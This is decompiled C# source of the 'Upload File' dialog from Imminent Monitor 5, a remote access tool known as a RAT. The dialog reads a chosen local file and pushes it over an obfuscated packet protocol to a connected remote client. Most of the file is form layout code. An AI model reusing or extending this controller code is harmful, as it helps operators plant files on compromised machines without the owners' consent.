// Decompiled with JetBrains decompiler
// Type: FormUploadDialog
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormUploadDialog : Form
{
  private IContainer icontainer_0;
  private TextBox textBox_0;
  private Button button_0;
  private Button button_1;
  private Control0 control0_0;
  private GClass18 gclass18_0;
  private string string_0;

  public FormUploadDialog(GClass18 gclass18_1, string string_1)
  {
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.string_0 = string_1;
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormUploadDialog));
    this.vmethod_1(new TextBox());
    this.vmethod_3(new Button());
    this.vmethod_5(new Button());
    this.vmethod_7(new Control0());
    this.SuspendLayout();
    this.vmethod_0().BackColor = Color.White;
    TextBox textBox1 = this.vmethod_0();
    Point point1 = new Point(12, 12);
    Point point2 = point1;
    textBox1.Location = point2;
    this.vmethod_0().Name = "TextBoxFile";
    this.vmethod_0().ReadOnly = true;
    TextBox textBox2 = this.vmethod_0();
    Size size1 = new Size(285, 22);
    Size size2 = size1;
    textBox2.Size = size2;
    this.vmethod_0().TabIndex = 0;
    Button button1 = this.vmethod_2();
    point1 = new Point(303, 12);
    Point point3 = point1;
    button1.Location = point3;
    this.vmethod_2().Name = "ButtonSelectFile";
    Button button2 = this.vmethod_2();
    size1 = new Size(32, 23);
    Size size3 = size1;
    button2.Size = size3;
    this.vmethod_2().TabIndex = 1;
    this.vmethod_2().Text = "...";
    this.vmethod_2().UseVisualStyleBackColor = true;
    Button button3 = this.vmethod_4();
    point1 = new Point(12, 40);
    Point point4 = point1;
    button3.Location = point4;
    this.vmethod_4().Name = "ButtonUpload";
    Button button4 = this.vmethod_4();
    size1 = new Size(75, 23);
    Size size4 = size1;
    button4.Size = size4;
    this.vmethod_4().TabIndex = 2;
    this.vmethod_4().Text = "Upload";
    this.vmethod_4().UseVisualStyleBackColor = true;
    this.vmethod_6().ForeColor = Color.CornflowerBlue;
    this.vmethod_6().method_3((Control0.Enum9) 0);
    Control0 control0_1 = this.vmethod_6();
    point1 = new Point(86, 50);
    Point point5 = point1;
    control0_1.Location = point5;
    this.vmethod_6().Name = "Preloader1";
    this.vmethod_6().method_1(5);
    Control0 control0_2 = this.vmethod_6();
    size1 = new Size(273, 10);
    Size size5 = size1;
    control0_2.Size = size5;
    this.vmethod_6().TabIndex = 3;
    this.vmethod_6().Text = "Preloader1";
    this.vmethod_6().Visible = false;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(342, 73);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.FormBorderStyle = FormBorderStyle.FixedDialog;
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.MaximizeBox = false;
    this.Name = nameof (FormUploadDialog);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Upload File";
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual TextBox vmethod_0() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(TextBox textBox_1) => this.textBox_0 = textBox_1;

  internal virtual Button vmethod_2() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_2);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_2;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  internal virtual Button vmethod_4() => this.button_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.button_1 != null)
      this.button_1.Click -= eventHandler;
    this.button_1 = button_2;
    if (this.button_1 == null)
      return;
    this.button_1.Click += eventHandler;
  }

  internal virtual Control0 vmethod_6() => this.control0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(Control0 control0_1) => this.control0_0 = control0_1;

  private void method_0(object sender, EventArgs e)
  {
    this.Text = "Uploading...";
    this.vmethod_4().Enabled = false;
    this.vmethod_6().Visible = true;
    new Thread((ParameterizedThreadStart) (object_0 => this.method_1(Conversions.ToString(object_0)))).Start((object) this.vmethod_0().Text);
    this.vmethod_6().Select();
    this.vmethod_6().Focus();
  }

  private void method_1(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[7]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FastTransfer,
    (object) 0,
    (object) 0,
    (object) File.ReadAllBytes(string_1),
    (object) Path.GetFileName(string_1),
    (object) true,
    (object) this.string_0
  });

  private void method_2(object sender, EventArgs e)
  {
    using (OpenFileDialog openFileDialog = new OpenFileDialog())
    {
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.vmethod_0().Text = openFileDialog.FileName;
    }
  }
}
